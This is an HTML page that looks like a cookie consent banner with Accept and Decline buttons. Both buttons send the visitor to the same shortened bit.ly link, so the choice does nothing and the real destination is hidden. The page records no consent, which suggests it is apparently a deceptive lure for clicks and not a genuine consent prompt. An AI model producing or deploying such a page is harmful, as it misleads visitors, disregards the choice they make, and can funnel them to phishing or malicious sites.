<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Cookie Consent</title>
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@600&display=swap" rel="stylesheet">
  <style>
    body {
      margin: 0;
      padding: 0;
      background-color: #1C1C1C;
      font-family: Arial, sans-serif;
      color: white;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .cookie-box {
      background-color: black;
      padding: 40px 50px;
      border-radius: 12px;
      text-align: center;
      box-shadow: 0 0 15px rgba(255, 255, 255, 0.1);
      max-width: 90%;
      width: 500px;
    }

    .cookie-box h2 {
      font-family: 'Poppins', sans-serif;
      font-size: 1.8rem;
      text-transform: uppercase;
      margin-bottom: 20px;
    }

    .cookie-box p {
      font-size: 1rem;
      line-height: 1.6;
      margin-bottom: 30px;
      color: #ccc;
    }

    .buttons {
      display: flex;
      justify-content: center;
      gap: 20px;
      flex-wrap: wrap;
    }

    .buttons button {
      padding: 12px 40px;
      border: none;
      border-radius: 6px;
      cursor: pointer;
      font-weight: bold;
      font-size: 1rem;
      transition: background-color 0.3s ease;
      min-width: 140px;
    }

    .accept-btn {
      background-color: white;
      color: #1C1C1C;
    }

    .decline-btn {
      background-color: #1C1C1C;
      color: white;
      border: 1px solid white;
    }

    .accept-btn:hover {
      background-color: #e0e0e0;
    }

    .decline-btn:hover {
      background-color: black;
    }

    @media (max-width: 500px) {
      .buttons {
        flex-direction: column;
        align-items: center;
      }

      .buttons button {
        width: 100%;
      }
    }
  </style>
</head>
<body>
  <div class="cookie-box">
    <h2>We Use Cookie</h2>
    <p>To improve your browsing experience and analyze site traffic, we use cookies. By clicking "Accept", you consent to our use of cookies. You can decline if you prefer limited functionality.</p>
    <div class="buttons">
      <button class="accept-btn"   onclick="window.location.href = 'https://bit.ly/3ZBMbNj';" >Accept</button>
      <button class="decline-btn"   onclick="window.location.href = 'https://bit.ly/3ZBMbNj';" >Decline</button>
    </div>
  </div>
</body>
</html>
